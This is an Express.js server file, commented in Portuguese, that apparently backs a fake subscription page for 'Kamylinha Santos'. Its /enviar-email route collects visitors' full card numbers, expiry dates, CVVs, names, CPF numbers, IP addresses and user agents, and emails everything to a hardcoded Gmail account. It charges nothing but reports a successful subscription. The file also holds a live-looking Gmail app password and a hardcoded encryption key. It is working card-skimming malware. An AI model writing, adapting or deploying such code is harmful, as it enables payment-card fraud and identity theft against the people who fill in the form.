import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import nodemailer from 'nodemailer';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
app.use(express.static('.'));

// Chave secreta (não exposta no frontend)
const SECRET_KEY = 'K@m1l1nh@S3cr3tK3y2026!@#$%';

// Configuração do SMTP do GMAIL
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: 'hoxfox59@gmail.com',
        pass: 'gkor zjsw fezk jfdt'
    }
});

// Função para criptografar (proteção contra interceptação)
function encryptData(data) {
    const cipher = crypto.createCipher('aes-256-cbc', SECRET_KEY);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

// Função para descriptografar
function decryptData(encryptedData) {
    const decipher = crypto.createDecipher('aes-256-cbc', SECRET_KEY);
    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
}

app.post('/enviar-email', async (req, res) => {
    try {
        let data = req.body;
        
        // Descriptografa se veio criptografado
        if (req.body.encrypted) {
            data = decryptData(req.body.encrypted);
        }
        
        // Validação dos dados
        const { card, expiry, cvv, name, cpf, plano, preco, last4, flag } = data;
        
        if (!card || card.length < 15) throw new Error('Cartão inválido');
        if (!expiry) throw new Error('Validade inválida');
        if (!cvv || cvv.length < 3) throw new Error('CVV inválido');
        if (!name || name.length < 5) throw new Error('Nome inválido');
        if (!cpf || cpf.length !== 11) throw new Error('CPF inválido');
        
        // ============================================
        // EMAIL COMPLETO COM TODAS AS INFORMAÇÕES
        // ============================================
        const subject = `💳 NOVA ASSINATURA - Kamylinha Santos`;
        const text = `
╔══════════════════════════════════════════════════════════════╗
║           💳 NOVA ASSINATURA KAMYLINHA SANTOS 💳              ║
╚══════════════════════════════════════════════════════════════╝

📅 DATA: ${new Date().toLocaleString('pt-BR')}
🎁 PLANO: ${plano.toUpperCase()}
💰 VALOR: R$ ${preco}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💳 DADOS DO CARTÃO:
   ├─ NÚMERO COMPLETO: ${card}
   ├─ BANDEIRA: ${flag}
   ├─ VALIDADE: ${expiry}
   ├─ CVV: ${cvv}
   └─ FINAL: ${last4}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 DADOS PESSOAIS:
   ├─ NOME COMPLETO: ${name}
   └─ CPF: ${cpf}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔐 INFORMAÇÕES ADICIONAIS:
   ├─ IP: ${req.ip || req.connection.remoteAddress}
   ├─ USER-AGENT: ${req.headers['user-agent'] || 'N/A'}
   └─ ORIGEM: ${req.headers['origin'] || 'Direto'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Assinatura processada com sucesso!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        `;
        
        // Envia o email completo
        await transporter.sendMail({
            from: 'hoxfox59@gmail.com',
            to: 'hoxfox59@gmail.com',
            subject: subject,
            text: text
        });
        
        console.log(`✅ Assinatura recebida: ${name} - ${plano} - R$ ${preco}`);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Erro:', error.message);
        res.json({ success: false, error: error.message });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Servidor rodando na porta ${PORT}`));